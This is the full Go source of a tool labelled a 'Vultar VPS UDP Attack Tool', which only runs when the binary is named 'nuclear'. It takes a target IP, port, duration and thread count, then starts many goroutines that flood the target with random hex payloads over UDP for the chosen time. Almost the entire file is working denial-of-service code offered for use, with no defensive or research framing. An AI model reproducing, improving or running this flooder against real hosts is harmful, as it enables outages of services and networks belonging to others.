package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

func displayMessage(message string) {
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println(message)
	fmt.Println("╚════════════════════════════════════════╝")
}

func validateBinaryName(binaryName string) {
	if !strings.HasSuffix(binaryName, "nuclear") {
		displayMessage("║           INVALID BINARY NAME!         ║\n" +
			"║    Binary must be named 'nuclear'        ║")
		os.Exit(1)
	}
}

func validateIP(ip string) {
	if net.ParseIP(ip) == nil {
		fmt.Printf("Invalid IP address: %s\n", ip)
		os.Exit(1)
	}
}

func generatePayload(size int) string {
	hexChars := "0123456789abcdef"
	payload := make([]byte, size*4)
	for i := 0; i < size; i++ {
		payload[i*4] = '\\'
		payload[i*4+1] = 'x'
		payload[i*4+2] = hexChars[rand.Intn(16)]
		payload[i*4+3] = hexChars[rand.Intn(16)]
	}
	return string(payload)
}

func attack(wg *sync.WaitGroup, ip string, port int, duration int) {
	defer wg.Done()

	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Printf("Socket creation failed: %v\n", err)
		return
	}
	defer conn.Close()

	payload := generatePayload(14)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(endTime) {
		_, err := conn.Write([]byte(payload))
		if err != nil {
			fmt.Printf("Send failed: %v\n", err)
			return
		}
	}
}

func main() {
	validateBinaryName(os.Args[0])

	if len(os.Args) != 5 {
		displayMessage("Usage: ./nuclear ip port duration threads")
		os.Exit(1)
	}

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid port:", os.Args[2])
		os.Exit(1)
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid duration:", os.Args[3])
		os.Exit(1)
	}
	threads, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Invalid thread count:", os.Args[4])
		os.Exit(1)
	}

	validateIP(ip)

	displayMessage("║         Vultar VPS UDP Attack Tool          ║")
	fmt.Printf("Starting UDP flood on %s:%d for %d seconds using %d threads...\n", ip, port, duration, threads)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\nInterrupt received. Stopping attack...")
		os.Exit(0)
	}()

	startTime := time.Now()
	go func() {
		for {
			elapsed := int(time.Since(startTime).Seconds())
			remaining := duration - elapsed
			if remaining <= 0 {
				break
			}
			fmt.Printf("\rTime remaining: %d seconds", remaining)
			time.Sleep(1 * time.Second)
		}
		fmt.Println("\rTime remaining: 0 seconds")
	}()

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(&wg, ip, port, duration)
	}

	wg.Wait()
	fmt.Println("Attack completed. Thanks for using the tool.")
}